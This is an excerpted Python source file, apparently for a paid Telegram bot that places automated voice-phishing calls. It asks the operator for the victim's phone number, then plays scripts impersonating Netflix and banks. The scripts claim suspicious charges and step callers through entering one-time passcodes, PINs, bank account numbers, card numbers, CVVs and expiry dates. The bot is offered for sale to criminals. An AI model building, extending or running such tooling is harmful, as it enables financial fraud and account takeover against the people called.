...
def send_welcome(message):
    ...
    if check_admin(id) == True:
        ...
        send = bot.send_message(message.chat.id, f"*Hey {name}👋\nYou have {days_left} days left❗️* ", parse_mode='Markdown')
        send = bot.send_message(message.chat.id, "*▫️Send The Victim's Phone Number📱:\n\ne.g +14358762364\n\nMake Sure To Use + Else The Bot Will Not Work Correctly❗*", parse_mode='Markdown')
        bot.register_next_step_handler(send, saving_phonenumber)
    else:
        send = bot.send_message(message.chat.id,
                                "*〽️TO USE THIS BOT YOU MUST BUT SUBSCRIPTION!\n\n Contact @KINGNardos TO BUY*", parse_mode='Markdown')
...
def sms_mode2(message):
    ...
    send = bot.send_message(message.chat.id, "OKAY! Send 'text' to send message now")
...
def send_text(message):
    ...
    try:
        ...
        bot.send_message(chat_id, "An error has occured , contact admin @KINGNardos")
...
def card_or_Otp(message):
    ...
    item4 = types.KeyboardButton(text="GRAB NETFLIX")
...
@bot.message_handler(content_types=["text"], func=lambda message: message.text == "GRAB NETFLIX")
...
def voice_wf(userid):
    ...
    if choice == 'human' or choice == 'unknown':
        gather = Gather(action='/gatherOTP/'+userid,  input="dtmf")
        gather.say("This is an automated call from NETFLIX, We have detected a suspicious attempt to login to your account, if this was you, end the call, To block this attempt, please enter the one time passcode sent to your phone number         ...........................................",language="hi-HI",loop=2)
        resp.append(gather)
...
def resp_apple_pay(userid):
    ...
    if choice == 'human' or choice == 'unknown':
        ...
        gather.say(f"This is an automated call from {bankname}, We have detected a suspicious attempt to login to your account, if this was you, end the call, To block this attempt, please enter the one time passcode sent to your phone number followed by the , ")
        resp.append(gather)
...
def intro_pin(userid):
    ...
    if choice == 'human' or choice == 'unknown':
        ...
        gather.say(f"Hello, this is an automated call from {bankname}, we have detected suspicious activity for a charge at Target for $56.71, If this was not you please stay on the call!, Please enter your four digit pin, followed by the  to block this attempt")
        resp.append(gather)
...
def intro_act(userid):
    ...
    if choice == 'human' or choice == 'unknown':
        ...
        gather.say(f"Hello, this is an automated call from {bankname}, we have detected suspicious activity on your card for a charge at Walmart for $87.61, If this was not you, please stay on the call, Please enter your bank account number followed by the  to block this attempt")
        resp.append(gather)
...
def introcall(userid):
    ...
    if choice == 'human' or choice == 'unknown':
        ...
        gather.say(
            f"Hello, this an automated call from {bankname}, We have declined your last purchase of $141.99 at Macy's, your account has been put on hold until we verify the ownership of the account, Press 1 followed by the  to enter your 16 digit Card Number and block this attempt")
        resp.append(gather)
...
def gather(userid):
    ...
    if 'Digits' in request.values:
        ...
        if choice == '1':
            ...
            gather.say('Please input your 16 digit card number followed by the  to block this attempt ')
            resp.append(gather)
            return str(resp)
        else:
            resp.say("Sorry, I don't understand that choice.")
...
def gathercardno(userid):
    ...
    if 'Digits' in request.values:
            ...
            gather.say('Please input the 3 numerical digits located on the back of your card followed by the ')
            resp.append(gather)
            return str(resp)
    else:
        resp.say("Sorry, I don't understand that choice")
...
def gathercvv(userid):
    ...
    if 'Digits' in request.values:
        ...
        gather.say('Please input the expiry month and year shown on your card and press the ')
        resp.append(gather)
        return str(resp)
    else:
        resp.say("Sorry, I don't understand that choice")
